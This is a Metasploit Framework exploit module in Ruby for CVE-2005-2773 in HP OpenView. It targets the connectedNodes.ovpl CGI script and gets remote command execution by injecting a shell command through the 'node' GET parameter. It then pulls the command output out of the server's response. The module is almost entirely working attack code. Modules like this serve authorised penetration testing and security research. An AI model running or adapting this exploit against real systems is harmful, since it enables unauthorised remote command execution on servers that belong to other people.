##
# $Id: openview_connectednodes_exec.rb 9671 2010-07-03 06:21:31Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'HP Openview connectedNodes.ovpl Remote Command Execution',
			'Description'    => %q{
					This module exploits an arbitrary command execution vulnerability in the
				HP OpenView connectedNodes.ovpl CGI application. The results of the command
				will be displayed to the screen.
			},
			'Author'         => [ 'Valerio Tesei <valk[at]mojodo.it>', 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9671 $',
			'References'     =>
				[
					['CVE', '2005-2773'],
					['OSVDB', '19057'],
					['BID', '14662'],
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'DisableNops' => true,
					'Space'       => 1024,
					'Compat'      =>
						{
							'PayloadType' => 'cmd',
							'RequiredCmd' => 'generic perl telnet',
						}
				},
			'Platform'       => 'unix',
			'Arch'           => ARCH_CMD,
			'Targets'        => [[ 'Automatic', { }]],
			'DisclosureDate' => 'Aug 25 2005',
			'DefaultTarget' => 0))

		register_options(
			[
				OptString.new('URI', [true, "The full URI path to connectedNodes.ovpl", "/OvCgi/connectedNodes.ovpl"]),
			], self.class)
	end

	def exploit

		# Trigger the command execution bug
		res = send_request_cgi({
				'uri'      => datastore['URI'],
				'vars_get' =>
					{
						'node'    => %Q!; echo YYY; #{payload.encoded}; echo YYY| tr "\\n" "#{0xa3.chr}"!
					}
				}, 25)

		if (res)
			print_status("The server returned: #{res.code} #{res.message}")
			print("")

			m = res.body.match(/YYY(.*)YYY/)

			if (m)
				print_status("Command output from the server:")
				print(m[1])
			else
				print_status("This server may not be vulnerable")
			end

		else
			print_status("No response from the server")
		end
	end

end
